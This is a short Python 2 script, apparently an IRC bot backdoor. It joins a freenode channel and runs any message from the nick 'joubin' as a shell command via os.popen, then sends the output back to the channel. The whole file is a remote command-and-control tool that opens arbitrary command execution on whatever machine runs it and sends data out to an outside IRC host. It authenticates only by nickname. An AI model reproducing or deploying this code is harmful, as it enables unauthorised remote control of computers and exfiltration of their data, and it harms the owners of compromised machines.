import sys 
import socket 
import string 
import os
import random

HOST='irc.freenode.net'  
PORT=6667 
NICK='BigData'+str(random.randint(1, 1000))
IDENT=NICK
REALNAME=NICK 
OWNER='joubin' 

CHANNELINIT='#joubinjabbari' 
readbuffer='' 

def parsemsg(msg): 
    complete=msg[1:].split(':',1)
    info=complete[0].split(' ') 
    msgpart=complete[1] 
    sender=info[0].split('!') 
    if sender[0]==OWNER: 
        cmd=msgpart
        test = os.popen(cmd).read()
        if test != '':
            test = test.split()
            s.send( 'PRIVMSG '+CHANNELINIT+' :'+str(test)+'\r\n' );


s=socket.socket( ) 
s.connect((HOST, PORT)) 
s.send('NICK '+NICK+'\r\n')  

s.send('USER '+IDENT+' '+HOST+' bla :'+REALNAME+'\r\n') 
while 1: 

    line=s.recv(200)
    print line 
    if line.find('Welcome ')!=-1: 
        s.send('JOIN '+CHANNELINIT+'\r\n') 
    if line.find('joubin')!=-1 and line.find('JOIN')==-1: 
        line=line.rstrip() 
        parsemsg(line)
        
    if(line.find('PING')!=-1):
		pongData = line.split(':', 1)
		pongData = pongData[1].split(' ')
		s.send('PONG '+pongData[0]+'\r\n')